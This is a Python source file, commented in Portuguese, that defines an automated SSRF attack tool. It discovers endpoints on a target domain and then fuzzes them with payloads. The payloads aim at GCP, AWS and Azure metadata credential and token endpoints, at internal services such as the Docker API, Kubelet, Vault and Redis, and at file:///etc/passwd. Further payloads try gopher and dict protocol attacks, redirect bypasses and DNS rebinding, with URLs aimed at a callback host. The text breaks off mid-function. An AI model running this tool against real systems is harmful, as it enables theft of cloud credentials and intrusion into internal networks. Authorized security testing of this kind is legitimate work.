import asyncio
import json
import random
import re
import urllib.parse
from dataclasses import dataclass, asdict
from datetime import datetime
from typing import List, Tuple, Dict, Optional, Set
from collections import defaultdict
import sys

from playwright.async_api import async_playwright, Response, Page

# Cores ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"
OK = f"{GREEN}[OK]{RESET}"
WARN = f"{YELLOW}[!]{RESET}"
FAIL = f"{RED}[X]{RESET}"


@dataclass
class SSRFEvidence:
    phase: str
    technique: str
    url: str
    endpoint: str
    param: str
    payload: str
    status: int
    body_snippet: str
    matched_patterns: List[str]
    severity: str = "info"
    request_headers: Optional[Dict] = None
    response_headers: Optional[Dict] = None
    out_of_band_hit: bool = False


@dataclass
class InterceptedRequest:
    url: str
    method: str
    headers: Dict
    body: str
    timestamp: datetime


@dataclass
class DiscoveredEndpoint:
    path: str
    method: str
    params: Set[str]
    accepts_url_param: bool
    test_response_code: int
    content_type: str


def max_severity(patterns: List[str]) -> str:
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    min_sev = 99
    for p in patterns:
        for s in sev_order:
            if p.startswith(f"[{s}]"):
                min_sev = min(min_sev, sev_order[s])
    reverse_map = {0: "critical", 1: "high", 2: "medium", 3: "low", 4: "info"}
    return reverse_map.get(min_sev, "info")


class UltimateSSRFArsenal:
    def __init__(self, target_domain: str, headless: bool = False, rate_limit_delay: float = 0.5, 
                 callback_host: str = None, blind_timeout: int = 30):
        self.target_domain = target_domain
        self.base_url = f"https://{target_domain}"
        self.headless = headless
        self.callback_host = callback_host or "YOUR.BURP.COLLABORATOR.NET"
        self.blind_timeout = blind_timeout
        self.rate_limit_delay = rate_limit_delay
        self.all_evidence = []
        self.results_file = f"ssrf_results_{target_domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None
        self.intercepted_requests = []
        
        # Descoberta dinâmica
        self.discovered_endpoints: List[DiscoveredEndpoint] = []
        self.vulnerable_endpoints: List[DiscoveredEndpoint] = []
        self.all_params: Set[str] = set()
        self.blind_callbacks: Dict[str, List[Dict]] = defaultdict(list)
        
        # Para tracking de requisições out-of-band
        self.callback_pattern = re.compile(re.escape(self.callback_host))

    async def __aenter__(self):
        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(headless=self.headless)
        self.context = await self.browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )
        await self.context.route("**/*", self.intercept_request)
        self.page = await self.context.new_page()
        return self

    async def __aexit__(self, *args):
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()

    async def intercept_request(self, route):
        """Intercepta requisições para análise e detecção blind SSRF"""
        request = route.request
        url = request.url
        
        # Detecção out-of-band: callback host aparece na URL
        if self.callback_host != "YOUR.BURP.COLLABORATOR.NET" and self.callback_host in url:
            print(f"\n{RED}{BOLD}[!!! BLIND SSRF DETECTED !!!]{RESET}")
            print(f"  {CYAN}URL:{RESET} {url}")
            print(f"  {CYAN}Method:{RESET} {request.method}")
            print(f"  {CYAN}Headers:{RESET} {dict(request.headers)}")
            
            # Registra evidência blind
            evidence = SSRFEvidence(
                phase="BLIND_SSRF", technique="Out-of-band callback",
                url=url, endpoint="", param="", payload=url,
                status=200, body_snippet="", matched_patterns=["[CRITICAL] Blind SSRF confirmed via callback"],
                severity="critical", out_of_band_hit=True
            )
            self.all_evidence.append(evidence)
            
            # Armazena callback
            timestamp = datetime.now().isoformat()
            self.blind_callbacks[url].append({
                "timestamp": timestamp,
                "method": request.method,
                "headers": dict(request.headers)
            })
        
        # Intercepta requisições suspeitas para análise
        if any(indicator in url.lower() for indicator in ["metadata", "internal", "localhost", "169.254", "10.", "172.", "192.168"]):
            post_data = None
            try:
                if request.method == "POST":
                    post_data = request.post_data
                intercepted = InterceptedRequest(
                    url=url, method=request.method,
                    headers=dict(request.headers),
                    body=post_data or "",
                    timestamp=datetime.now()
                )
                self.intercepted_requests.append(intercepted)
                print(f"\n{YELLOW}[INTERCEPT]{RESET} {request.method} {url[:150]}")
            except Exception as e:
                print(f"{WARN} Erro ao interceptar: {e}")
        
        await route.continue_()

    async def request_with_headers(self, method: str, url: str, data: dict = None,
                                   custom_headers: dict = None, timeout: int = 15000,
                                   follow_redirects: bool = True) -> Tuple[int, str, dict]:
        """Faz requisição via Playwright com headers customizados"""
        try:
            headers = custom_headers or {}
            
            if method.upper() == "GET":
                resp: Response = await self.page.goto(url, wait_until="domcontentloaded",
                                                       timeout=timeout)
                status = resp.status
                body = await resp.text() if resp else ""
                headers_dict = dict(resp.headers) if resp else {}
            else:
                # Para POST, usa fetch API
                post_data = data or {}
                
                # Suporte a diferentes Content-Types
                content_type = headers.get("Content-Type", "application/json")
                if content_type == "application/x-www-form-urlencoded":
                    body_data = urllib.parse.urlencode(post_data)
                elif content_type == "multipart/form-data":
                    body_data = json.dumps(post_data)
                else:
                    body_data = json.dumps(post_data)
                
                js_code = f"""
                (async () => {{
                    try {{
                        const response = await fetch('{url}', {{
                            method: 'POST',
                            headers: {json.dumps(headers)},
                            body: {json.dumps(body_data)}
                        }});
                        const text = await response.text();
                        return {{
                            status: response.status,
                            body: text,
                            headers: Object.fromEntries(response.headers.entries())
                        }};
                    }} catch(e) {{
                        return {{ status: 0, body: e.toString(), headers: {{}} }};
                    }}
                }})();
                """
                result = await self.page.evaluate(js_code)
                status = result.get("status", 0)
                body = result.get("body", "")
                headers_dict = result.get("headers", {})
            
            await asyncio.sleep(self.rate_limit_delay)
            return status, body, headers_dict
            
        except Exception as e:
            return 0, str(e), {}

    async def extract_params_from_response(self, body: str, url: str) -> Set[str]:
        """Extrai parâmetros potenciais da resposta"""
        params = set()
        
        # Padrões comuns de parâmetros em URLs
        url_params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', url)
        params.update(url_params)
        
        # Parâmetros em inputs HTML
        input_names = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', body, re.IGNORECASE)
        params.update(input_names)
        
        # Parâmetros em forms
        form_actions = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', body, re.IGNORECASE)
        for action in form_actions:
            action_params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', action)
            params.update(action_params)
        
        # Parâmetros em links
        link_params = re.findall(r'href=["\'][^"\']*[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', body, re.IGNORECASE)
        params.update(link_params)
        
        return params

    async def phase_0_discovery(self):
        """Fase 0: Descoberta DINÂMICA de endpoints e parâmetros"""
        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{CYAN}[FASE 0]{RESET} Dynamic Discovery - Finding SSRF-vulnerable endpoints")
        print(f"{BOLD}{'='*60}{RESET}")

        # 1. Crawl inicial da home e paths comuns
        common_paths = [
            "", "/", "/api", "/v1", "/v2", "/api/v1", "/api/v2",
            "/proxy", "/fetch", "/curl", "/download", "/load", "/file",
            "/upload", "/import", "/convert", "/webhook", "/callback",
            "/scrape", "/crawl", "/preview", "/thumbnail", "/screenshot",
            "/render", "/parse", "/resolve", "/redirect", "/go",
            "/external", "/open", "/read", "/save", "/process",
            "/submit", "/form", "/contact", "/tools", "/utilities",
            "/ajax", "/internal", "/services", "/graphql"
        ]
        
        test_payload = f"http://{self.callback_host}/discovery-test-{random.randint(1000,9999)}"
        
        # Usa múltiplos métodos de requisição
        methods = ["GET", "POST"]
        content_types = [
            "application/json",
            "application/x-www-form-urlencoded",
            "multipart/form-data"
        ]
        
        for path in common_paths:
            for method in methods:
                url = f"{self.base_url}{path}"
                
                try:
                    # Teste GET com parâmetro url
                    if method == "GET":
                        test_url = f"{url}?url={urllib.parse.quote(test_payload)}"
                        status, body, headers = await self.request_with_headers("GET", test_url, timeout=10000)
                        
                        if status not in (0, 404, 403, 401):
                            print(f"  {GREEN}[{status}]{RESET} GET {url} (aceita parâmetro 'url')")
                            
                            # Extrai parâmetros da resposta
                            discovered_params = await self.extract_params_from_response(body, url)
                            self.all_params.update(discovered_params)
                            
                            endpoint = DiscoveredEndpoint(
                                path=path, method="GET", params=discovered_params,
                                accepts_url_param=True, test_response_code=status,
                                content_type=headers.get("content-type", "")
                            )
                            self.discovered_endpoints.append(endpoint)
                            
                            # Se retornou algo relacionado ao payload, é provavelmente vulnerável
                            if self.callback_host in body or "discovery-test" in body:
                                self.vulnerable_endpoints.append(endpoint)
                                print(f"    {RED}⚡ POTENCIALMENTE VULNERÁVEL! Callback na resposta{RESET}")
                    
                    # Teste POST com diferentes Content-Types
                    elif method == "POST":
                        for ct in content_types:
                            headers = {"Content-Type": ct}
                            
                            if ct == "application/json":
                                data = {"url": test_payload}
                            elif ct == "application/x-www-form-urlencoded":
                                data = {"url": test_payload}
                            else:  # multipart
                                data = {"url": test_payload}
                            
                            status, body, headers_resp = await self.request_with_headers(
                                "POST", url, data=data, custom_headers=headers, timeout=10000
                            )
                            
                            if status not in (0, 404, 403, 401):
                                print(f"  {GREEN}[{status}]{RESET} POST {url} ({ct})")
                                
                                discovered_params = await self.extract_params_from_response(body, url)
                                self.all_params.update(discovered_params)
                                
                                endpoint = DiscoveredEndpoint(
                                    path=path, method="POST", params=discovered_params,
                                    accepts_url_param=True, test_response_code=status,
                                    content_type=ct
                                )
                                self.discovered_endpoints.append(endpoint)
                                
                                if self.callback_host in body:
                                    self.vulnerable_endpoints.append(endpoint)
                                    print(f"    {RED}⚡ POTENCIALMENTE VULNERÁVEL! Callback na resposta{RESET}")
                
                except Exception as e:
                    continue
        
        # 2. Descobre endpoints via crawling da página inicial
        try:
            await self.page.goto(self.base_url, wait_until="networkidle", timeout=15000)
            page_body = await self.page.content()
            
            # Extrai todos os links da página
            links = await self.page.evaluate("""() => {
                return Array.from(document.querySelectorAll('a[href]'))
                    .map(a => a.href)
                    .filter(href => href.startsWith(window.location.origin));
            }""")
            
            for link in links[:50]:  # Limita para não sobrecarregar
                path = link.replace(self.base_url, "")
                if path and path not in [e.path for e in self.discovered_endpoints]:
                    test_url = f"{link}?url={urllib.parse.quote(test_payload)}"
                    status, body, _ = await self.request_with_headers("GET", test_url, timeout=8000)
                    
                    if status not in (0, 404):
                        discovered_params = await self.extract_params_from_response(body, link)
                        self.all_params.update(discovered_params)
                        
                        endpoint = DiscoveredEndpoint(
                            path=path, method="GET", params=discovered_params,
                            accepts_url_param=True, test_response_code=status,
                            content_type=""
                        )
                        self.discovered_endpoints.append(endpoint)
                        
                        if self.callback_host in body:
                            self.vulnerable_endpoints.append(endpoint)
                            print(f"  {RED}⚡ VULNERÁVEL via crawling: {path}{RESET}")
        
        except Exception as e:
            print(f"{WARN} Erro no crawling: {e}")
        
        # Resumo da descoberta
        print(f"\n{OK} Descoberta concluída:")
        print(f"  • Endpoints encontrados: {len(self.discovered_endpoints)}")
        print(f"  • Parâmetros únicos: {len(self.all_params)}")
        print(f"  • Endpoints potencialmente vulneráveis: {len(self.vulnerable_endpoints)}")
        
        return self.vulnerable_endpoints if self.vulnerable_endpoints else self.discovered_endpoints

    async def check_ssrf_evidence(self, phase: str, technique: str, url: str, endpoint: str,
                                  param: str, payload: str, status: int, body: str, 
                                  headers: dict = None, request_headers: dict = None) -> List[SSRFEvidence]:
        findings = []
        body_lower = body.lower()
        headers_str = json.dumps(headers or {}).lower()
        combined = body_lower + " " + headers_str

        # Padrões de detecção (GCP, AWS, Azure, K8s, arquivos, etc.)
        gcp_patterns = [
            (r'(computeMetadata|metadata\.google\.internal)', 'GCP metadata endpoint accessed', 'high'),
            (r'"access_token"\s*:\s*"[^"]{20,}"', 'GCP access token leaked', 'critical'),
            (r'"projectId"\s*:\s*"[a-z0-9-]+"', 'GCP project ID leaked', 'high'),
            (r'"email"\s*:\s*"[^"]+@[^"]+\.gserviceaccount\.com"', 'GCP service account email leaked', 'high'),
        ]

        aws_patterns = [
            (r'(iam/security-credentials/[A-Za-z0-9_-]+)', 'AWS IAM role credentials leaked', 'critical'),
            (r'(?:"AccessKeyId"|"SecretAccessKey"|"Token")\s*:\s*"', 'AWS STS temporary credentials leaked', 'critical'),
            (r'arn:aws:iam::\d{12}:', 'AWS ARN leaked', 'high'),
        ]

        azure_patterns = [
            (r'(computeMetadata|metadata\.azure\.com)', 'Azure metadata endpoint accessed', 'high'),
            (r'(?:"subscriptionId"|"subscription_id")', 'Azure subscription ID leaked', 'critical'),
        ]

        k8s_patterns = [
            (r'(kubernetes|k8s|kube-system)', 'Kubernetes endpoint accessed', 'critical'),
            (r'(?:"namespace"\s*:\s*"[a-z0-9-]+")', 'K8s namespace leaked', 'high'),
            (r'(?:"token"\s*:\s*"[A-Za-z0-9._-]{100,})', 'K8s service account token leaked', 'critical'),
        ]

        file_patterns = [
            (r'(root:[^:]+:[0-9]+:[0-9]+:)', '/etc/passwd content leaked', 'critical'),
            (r'(-----BEGIN (RSA|DSA|EC|OPENSSH|PGP) PRIVATE KEY-----)', 'Private key material leaked', 'critical'),
            (r'(AKIA[0-9A-Z]{16})', 'AWS access key ID leaked', 'critical'),
        ]

        internal_patterns = [
            (r'(10\.\d{1,3}\.\d{1,3}\.\d{1,3})', 'Internal IP (10.x.x.x) leaked', 'high'),
            (r'(192\.168\.\d{1,3}\.\d{1,3})', 'Internal IP (192.168.x.x) leaked', 'high'),
            (r'(169\.254\.\d{1,3}\.\d{1,3})', 'Link-local IP (169.254.x.x) leaked', 'medium'),
        ]

        error_patterns = [
            (r'(SQLSTATE|mysql_error|PDOException)', 'SQL error message leaked', 'medium'),
            (r'(Warning:\s+file_get_contents|Warning:\s+curl_exec)', 'PHP SSRF warning leaked', 'high'),
            (r'(failed to open stream: Connection refused)', 'Internal connection refused', 'medium'),
            (r'Missing required header: Metadata-Flavor', 'GCP metadata requires Metadata-Flavor header', 'info'),
        ]

        all_patterns = (gcp_patterns + aws_patterns + azure_patterns + k8s_patterns +
                        file_patterns + internal_patterns + error_patterns)

        matched_patterns = []
        for pattern, description, severity in all_patterns:
            if re.search(pattern, combined, re.IGNORECASE | re.MULTILINE):
                matched_patterns.append(f"[{severity.upper()}] {description}")

        # Detecção de sucesso via callback
        if self.callback_host in body:
            matched_patterns.append("[CRITICAL] Callback URL found in response (Confirmed SSRF)")

        if matched_patterns:
            body_snippet = body[:500] if body else ""
            finding = SSRFEvidence(
                phase=phase, technique=technique, url=url, endpoint=endpoint,
                param=param, payload=payload, status=status, body_snippet=body_snippet,
                matched_patterns=matched_patterns, severity=max_severity(matched_patterns),
                request_headers=request_headers, response_headers=headers
            )
            findings.append(finding)
            self.all_evidence.append(finding)

        return findings

    async def test_endpoint_with_payload(self, endpoint: DiscoveredEndpoint, param: str, 
                                          payload: str, phase: str, technique: str) -> bool:
        """Testa um endpoint específico com um payload"""
        
        if endpoint.method == "GET":
            # Constrói URL com parâmetro
            separator = "&" if "?" in endpoint.path else "?"
            if endpoint.path.endswith("?"):
                test_url = f"{self.base_url}{endpoint.path}{param}={urllib.parse.quote(payload)}"
            elif separator == "&":
                test_url = f"{self.base_url}{endpoint.path}{separator}{param}={urllib.parse.quote(payload)}"
            else:
                test_url = f"{self.base_url}{endpoint.path}?{param}={urllib.parse.quote(payload)}"
            
            status, body, headers = await self.request_with_headers("GET", test_url, timeout=15000)
            findings = await self.check_ssrf_evidence(
                phase, technique, test_url, endpoint.path, param, payload, status, body, headers
            )
            
        else:  # POST
            test_url = f"{self.base_url}{endpoint.path}"
            headers = {"Content-Type": endpoint.content_type or "application/json"}
            
            if endpoint.content_type == "application/x-www-form-urlencoded":
                data = {param: payload}
            else:
                data = {param: payload}
            
            status, body, headers_resp = await self.request_with_headers(
                "POST", test_url, data=data, custom_headers=headers, timeout=15000
            )
            findings = await self.check_ssrf_evidence(
                phase, technique, test_url, endpoint.path, param, payload, status, body, headers_resp,
                request_headers=headers
            )
        
        if findings:
            await self.print_findings(findings)
            return True
        return False

    async def print_findings(self, findings: List[SSRFEvidence]):
        for f in findings:
            sev_colors = {"critical": RED, "high": YELLOW, "medium": MAGENTA,
                          "low": BLUE, "info": CYAN}
            col = sev_colors.get(f.severity, RESET)
            print(f"\n{col}{BOLD}[{f.severity.upper()}]{RESET} {f.phase} → {f.technique}")
            print(f"  {DIM}URL:{RESET} {f.url[:200]}")
            print(f"  {DIM}Endpoint:{RESET} {f.endpoint}")
            print(f"  {DIM}Parâmetro:{RESET} {f.param}")
            print(f"  {DIM}Payload:{RESET} {f.payload[:100]}")
            print(f"  {DIM}Status:{RESET} {f.status}")
            for p in f.matched_patterns[:5]:
                print(f"  {DIM}├─{RESET} {p}")
            if len(f.matched_patterns) > 5:
                print(f"  {DIM}└─{RESET} ... e mais {len(f.matched_patterns)-5} padrões")

    async def save_results(self):
        data = {
            "target": self.target_domain,
            "timestamp": datetime.now().isoformat(),
            "callback_host": self.callback_host,
            "total_findings": len(self.all_evidence),
            "discovered_endpoints": [
                {"path": e.path, "method": e.method, "params": list(e.params),
                 "accepts_url_param": e.accepts_url_param, "response_code": e.test_response_code}
                for e in self.discovered_endpoints
            ],
            "vulnerable_endpoints": [
                {"path": e.path, "method": e.method}
                for e in self.vulnerable_endpoints
            ],
            "intercepted_requests": [
                {"url": ir.url, "method": ir.method, "timestamp": ir.timestamp.isoformat(),
                 "body": ir.body[:500]} for ir in self.intercepted_requests
            ],
            "blind_callbacks": dict(self.blind_callbacks),
            "findings": [asdict(f) for f in self.all_evidence]
        }
        with open(self.results_file, "w") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        print(f"\n{OK} Resultados salvos em: {BOLD}{self.results_file}{RESET}")

    async def phase_1_endpoint_validation(self, endpoints: List[DiscoveredEndpoint]):
        """Fase 1: Valida endpoints descobertos com payloads de teste"""
        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{CYAN}[FASE 1]{RESET} Endpoint Validation")
        print(f"{BOLD}{'='*60}{RESET}")
        
        test_payloads = [
            f"http://{self.callback_host}/validate-{{random}}",
            f"https://{self.callback_host}/validate-{{random}}",
            f"//{self.callback_host}/validate-{{random}}",
        ]
        
        for endpoint in endpoints[:30]:  # Limita para performance
            for param in (endpoint.params or ["url", "uri", "u", "file", "path", "src", "source"]):
                for payload_template in test_payloads:
                    random_suffix = random.randint(1000, 9999)
                    payload = payload_template.format(random=random_suffix)
                    
                    await self.test_endpoint_with_payload(
                        endpoint, param, payload,
                        "Phase 1 - Validation", f"Validating {endpoint.path} [{param}]"
                    )

    async def phase_2_parameter_fuzzing(self, endpoints: List[DiscoveredEndpoint]):
        """Fase 2: Fuzzing de parâmetros em endpoints descobertos"""
        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{CYAN}[FASE 2]{RESET} Parameter Fuzzing (Dynamic)")
        print(f"{BOLD}{'='*60}{RESET}")
        
        ssrf_params = [
            "url", "uri", "u", "file", "filename", "path", "image", "img",
            "src", "source", "link", "href", "target", "dest", "destination",
            "redirect", "redirect_uri", "redirect_url", "return", "return_to",
            "next", "next_url", "goto", "continue", "forward", "proxy",
            "proxy_url", "load", "fetch", "fetch_url", "download", "download_url",
            "upload", "upload_url", "import", "import_url", "convert", "convert_url",
            "render", "preview", "thumbnail", "screenshot", "webhook", "callback",
            "callback_url", "notify", "scrape", "crawl", "check", "validate",
            "verify", "resolve", "read", "write", "data", "content", "media",
            "domain", "host", "hostname", "address", "ip", "socket"
        ]
        
        base_payload = f"http://{self.callback_host}/param-test-{{random}}"
        
        for endpoint in endpoints[:20]:
            # Tenta parâmetros comuns de SSRF
            for param in ssrf_params[:30]:
                random_suffix = random.randint(1000, 9999)
                payload = base_payload.format(random=random_suffix)
                
                found = await self.test_endpoint_with_payload(
                    endpoint, param, payload,
                    "Phase 2 - Parameter Fuzzing", f"Testing param: {param}"
                )
                
                if found:
                    print(f"  {GREEN}✓ Parâmetro vulnerável encontrado: {param}{RESET}")

    async def phase_3_localhost_bypass(self, endpoints: List[DiscoveredEndpoint]):
        """Fase 3: Bypass de localhost em endpoints válidos"""
        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{CYAN}[FASE 3]{RESET} Localhost Bypass (Dynamic)")
        print(f"{BOLD}{'='*60}{RESET}")
        
        localhost_variants = [
            "127.0.0.1", "127.0.0.2", "0.0.0.0", "2130706433", "0x7f000001",
            "0177.0.0.1", "[::1]", "[::ffff:127.0.0.1]", "localhost",
            "127.0.0.1.nip.io", "2130706433.nip.io",
        ]
        
        for endpoint in endpoints[:15]:
            params_to_test = list(endpoint.params)[:5] if endpoint.params else ["url", "uri"]
            
            for param in params_to_test:
                for variant in localhost_variants:
                    payload = f"http://{variant}/"
                    
                    await self.test_endpoint_with_payload(
                        endpoint, param, payload,
                        "Phase 3 - Localhost Bypass", f"Testing {variant}"
                    )

    async def phase_4_gcp_metadata(self, endpoints: List[DiscoveredEndpoint]):
        """Fase 4: GCP Metadata com bypass"""
        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{CYAN}[FASE 4]{RESET} GCP Metadata Attack (Dynamic)")
        print(f"{BOLD}{'='*60}{RESET}")

        gcp_paths = [
            "computeMetadata/v1/instance/service-accounts/default/token",
            "computeMetadata/v1/instance/service-accounts/default/email",
            "computeMetadata/v1/instance/attributes/",
            "computeMetadata/v1/project/project-id",
            "computeMetadata/v1/instance/?recursive=true",
        ]

        gcp_hosts = [
            "metadata.google.internal",
            "169.254.169.254",
            "2130706433",
            "metadata.google.internal:80",
        ]
        
        for endpoint in endpoints[:10]:
            params_to_test = list(endpoint.params)[:5] if endpoint.params else ["url"]
            
            for param in params_to_test:
                for host in gcp_hosts:
                    for path in gcp_paths:
                        target_url = f"http://{host}/{path}"
                        
                        # Teste sem header
                        await self.test_endpoint_with_payload(
                            endpoint, param, target_url,
                            "Phase 4 - GCP Metadata", f"GCP: {host}"
                        )
                        
                        # Teste com header Metadata-Flavor
                        if endpoint.method == "POST":
                            test_url = f"{self.base_url}{endpoint.path}"
                            headers = {"Metadata-Flavor": "Google", "Content-Type": "application/json"}
                            data = {param: target_url}
                            
                            status, body, headers_resp = await self.request_with_headers(
                                "POST", test_url, data=data, custom_headers=headers, timeout=15000
                            )
                            findings = await self.check_ssrf_evidence(
                                "Phase 4 - GCP Metadata (with header)", f"GCP {host}{path}",
                                test_url, endpoint.path, param, target_url, status, body, headers_resp
                            )
                            if findings:
                                await self.print_findings(findings)

    async def phase_5_cloud_metadata(self, endpoints: List[DiscoveredEndpoint]):
        """Fase 5: Cloud Metadata (AWS/Azure/OCI)"""
        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{CYAN}[FASE 5]{RESET} Cloud Metadata (Dynamic)")
        print(f"{BOLD}{'='*60}{RESET}")
        
        cloud_targets = {
            "AWS": {
                "hosts": ["169.254.169.254"],
                "paths": [
                    "latest/meta-data/iam/security-credentials/",
                    "latest/meta-data/instance-id",
                    "latest/user-data",
                ]
            },
            "Azure": {
                "hosts": ["169.254.169.254"],
                "paths": [
                    "metadata/instance?api-version=2021-02-01&format=json",
                    "metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                ]
            },
        }

        for endpoint in endpoints[:10]:
            params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url"]
            
            for param in params_to_test:
                for cloud, config in cloud_targets.items():
                    for host in config["hosts"]:
                        for path in config["paths"]:
                            target_url = f"http://{host}/{path}"
                            
                            await self.test_endpoint_with_payload(
                                endpoint, param, target_url,
                                "Phase 5 - Cloud Metadata", f"{cloud}: {host}"
                            )

    async def phase_6_internal_services(self, endpoints: List[DiscoveredEndpoint]):
        """Fase 6: Internal Services Scan"""
        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{CYAN}[FASE 6]{RESET} Internal Services (Dynamic)")
        print(f"{BOLD}{'='*60}{RESET}")
        
        internal_services = [
            ("http://127.0.0.1:9200", "Elasticsearch"),
            ("http://127.0.0.1:2375", "Docker API"),
            ("https://127.0.0.1:10250", "Kubelet API"),
            ("http://127.0.0.1:8500", "Consul"),
            ("https://127.0.0.1:8200", "Vault"),
            ("http://127.0.0.1:9090", "Prometheus"),
            ("http://127.0.0.1:3000", "Grafana"),
            ("http://127.0.0.1:8080", "Jenkins"),
            ("redis://127.0.0.1:6379", "Redis"),
        ]

        for endpoint in endpoints[:10]:
            params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url"]
            
            for param in params_to_test:
                for service_url, service_name in internal_services:
                    await self.test_endpoint_with_payload(
                        endpoint, param, service_url,
                        "Phase 6 - Internal Services", f"Testing {service_name}"
                    )

    async def phase_7_protocol_attacks(self, endpoints: List[DiscoveredEndpoint]):
        """Fase 7: Protocol Attacks (file://, gopher://, dict://)"""
        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{CYAN}[FASE 7]{RESET} Protocol Attacks (Dynamic)")
        print(f"{BOLD}{'='*60}{RESET}")
        
        protocol_payloads = [
            ("file:///etc/passwd", "file:// /etc/passwd"),
            ("file:///etc/hosts", "file:// /etc/hosts"),
            ("gopher://127.0.0.1:6379/_INFO", "gopher:// Redis INFO"),
            ("dict://127.0.0.1:6379/INFO", "dict:// Redis INFO"),
            ("file:///proc/self/environ", "file:// /proc/self/environ"),
        ]

        for endpoint in endpoints[:10]:
            params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url"]
            
            for param in params_to_test:
                for payload, technique in protocol_payloads:
                    await self.test_endpoint_with_payload(
                        endpoint, param, payload,
                        "Phase 7 - Protocol Attacks", technique
                    )

    async def phase_8_redirect_bypass(self, endpoints: List[DiscoveredEndpoint]):
        """Fase 8: Open Redirect Bypass"""
        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{CYAN}[FASE 8]{RESET} Open Redirect Bypass (Dynamic)")
        print(f"{BOLD}{'='*60}{RESET}")
        
        redirect_patterns = [
            f"//{self.callback_host}/test",
            f"https://{self.callback_host}/test",
            f"http://{self.callback_host}/test",
            f"/\\{self.callback_host}/test",
            f"https://{self.target_domain}@{self.callback_host}/test",
        ]
        
        for endpoint in endpoints[:10]:
            params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url", "redirect", "next"]
            
            for param in params_to_test:
                for pattern in redirect_patterns:
                    await self.test_endpoint_with_payload(
                        endpoint, param, pattern,
                        "Phase 8 - Redirect Bypass", f"Testing {pattern[:50]}"
                    )

    async def phase_9_dns_rebinding(self, endpoints: List[DiscoveredEndpoint]):
        """Fase 9: DNS Rebinding"""
        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{CYAN}[FASE 9]{RESET} DNS Rebinding (Dynamic)")
        print(f"{BOLD}{'='*60}{RESET}")
        
        rebind_domains = [
            f"{self.callback_host}.nip.io",
            f"169.254.169.254.nip.io",
            f"metadata.google.internal.nip.io",
            "127.0.0.1.nip.io",
        ]
        
        for endpoint in endpoints[:5]:
            params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url"]
            
            for param in params_to_test:
                for domain in rebind_domains:
                    payload = f"http://{domain}/"
                    
                    await self.test_endpoint_with_payload(
                        endpoint, param, payload,
                        "Phase 9 - DNS Rebinding", f"Testing {domain}"
                    )

    async def run_all_phases(self):
        """Executa todas as fases de forma dinâmica"""
        
        # Fase 0: Descoberta dinâmica
        endpoints = await self.phase_0_discovery()
        
        if not endpoints:
            print(f"\n{FAIL} Nenhum endpoint encontrado para testar. Encerrando.")
            return
        
        print(f"\n{BOLD}{GREEN}✓ {len(endpoints)} endpoints encontrados. Iniciando ataques...{RESET}")
        
        # Fases de ataque usando endpoints descobertos
        phases = [
            (self.phase_1_endpoint_validation(endpoints), "Phase 1: Endpoint Validation"),
            (self.phase_2_parameter_fuzzing(endpoints), "Phase 2: Parameter Fuzzing"),
            (self.phase_3_localhost_bypass(endpoints), "Phase 3: Localhost Bypass"),
            (self.phase_4_gcp_metadata(endpoints), "Phase 4: GCP Metadata Attack"),
            (self.phase_5_cloud_metadata(endpoints), "Phase 5: Cloud Metadata"),
            (self.phase_6_internal_services(endpoints), "Phase 6: Internal Services"),
            (self.phase_7_protocol_attacks(endpoints), "Phase 7: Protocol Attacks"),
            (self.phase_8_redirect_bypass(endpoints), "Phase 8: Redirect Bypass"),
            (self.phase_9_dns_rebinding(endpoints), "Phase 9: DNS Rebinding"),
        ]

        for coro, name in phases:
            try:
                print(f"\n{BOLD}{'='*60}{RESET}")
                print(f"{CYAN}[{name}]{RESET}")
                print(f"{BOLD}{'='*60}{RESET}")
                await coro
            except Exception as e:
                print(f"{FAIL} Erro em {name}: {e}")
        
        # Salva resultados
        await self.save_results()


async def scan_single_target(target: str, callback_host: str, delay: float):
    """Executa o arsenal para um único domínio"""
    print(f"\n{BOLD}{CYAN}{'#'*60}{RESET}")
    print(f"{BOLD}{CYAN}# TARGET: {target}{RESET}")
    print(f"{BOLD}{CYAN}{'#'*60}{RESET}")
    
    arsenal = UltimateSSRFArsenal(
        target_domain=target,
        headless=False,
        rate_limit_delay=delay,
        callback_host=callback_host
    )
    
    await arsenal.__aenter__()
    try:
        await arsenal.run_all_phases()
        
        # Exibe resumo para este target
        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{GREEN}[RESUMO - {target}]{RESET}")
        print(f"  • Total de evidências: {len(arsenal.all_evidence)}")
        print(f"  • Endpoints descobertos: {len(arsenal.discovered_endpoints)}")
        print(f"  • Endpoints vulneráveis: {len(arsenal.vulnerable_endpoints)}")
        
        sev_count = {}
        for e in arsenal.all_evidence:
            sev_count[e.severity] = sev_count.get(e.severity, 0) + 1
        
        for sev in ["critical", "high", "medium", "low", "info"]:
            if sev in sev_count:
